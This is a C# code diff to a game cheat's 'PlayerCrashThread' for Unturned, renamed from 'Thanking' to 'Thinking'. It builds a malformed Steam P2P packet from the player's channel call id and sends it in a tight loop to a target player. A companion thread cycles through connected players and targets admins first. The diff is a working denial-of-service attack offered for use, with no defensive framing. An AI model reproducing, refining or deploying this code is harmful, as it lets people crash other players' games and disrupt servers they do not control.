@@ -5,21 +5,21 @@ using System.Reflection;
 using System.Threading;
 using SDG.Unturned;
 using Steamworks;    
-using Thanking.Attributes;
- using Thanking.Options;
- using Thanking.Overrides;
- using Thanking.Utilities;
- using Thanking.Variables;
+using Thinking.Attributes;
+ using Thinking.Options;
+ using Thinking.Overrides;
+ using Thinking.Utilities;
+ using Thinking.Variables;
  using UnityEngine;
 
-namespace Thanking.Threads
+namespace Thinking.Threads
 {
     public static class PlayerCrashThread
     {
         public static bool ContinuousPlayerCrash;
         public static List<CSteamID> CrashTargets = new List<CSteamID>();
         public static CSteamID CrashTarget;
-        
+
         [Thread]
         public static void Start()
         {
@@ -27,13 +27,28 @@ namespace Thanking.Threads
 			DebugUtilities.Log("Player Crash Thread Started");
 			#endif
 
-            byte[] P1 = {(byte)ESteamPacket.UPDATE_RELIABLE_INSTANT, 0, 0};
-            
             while (true)
-                if (CrashTarget != CSteamID.Nil)
-                    SteamNetworking.SendP2PPacket(CrashTarget, P1, 3, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
-                else
+            {
+                while (!Provider.isConnected || Provider.isLoading || !OptimizationVariables.MainPlayer)
                     Thread.Sleep(500);
+                
+                SteamChannel sc = OptimizationVariables.MainPlayer.input.channel;
+
+                byte b = (byte)sc.getCall("askInput");
+                byte[] P2 =
+                {
+                    (byte) ESteamPacket.UPDATE_UNRELIABLE_CHUNK_BUFFER, b, 255
+                };
+
+                uint LP2 = (uint)P2.Length;
+                int ch = sc.id;
+                
+                while (Provider.isConnected)    
+                    if (CrashTarget != CSteamID.Nil)
+                        SteamNetworking.SendP2PPacket(CrashTarget, P2, LP2, EP2PSend.k_EP2PSendUnreliableNoDelay, ch);
+                    else
+                        Thread.Sleep(500);
+            }
         }
 
         [Thread]
@@ -42,7 +57,7 @@ namespace Thanking.Threads
             while (true)
             {
                 if (Provider.clients.All(p => CrashTarget != p.playerID.steamID))
-                {
+                {    
                     if (ContinuousPlayerCrash && Provider.clients.Count > 1)
                     {
                         CSteamID? sid = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
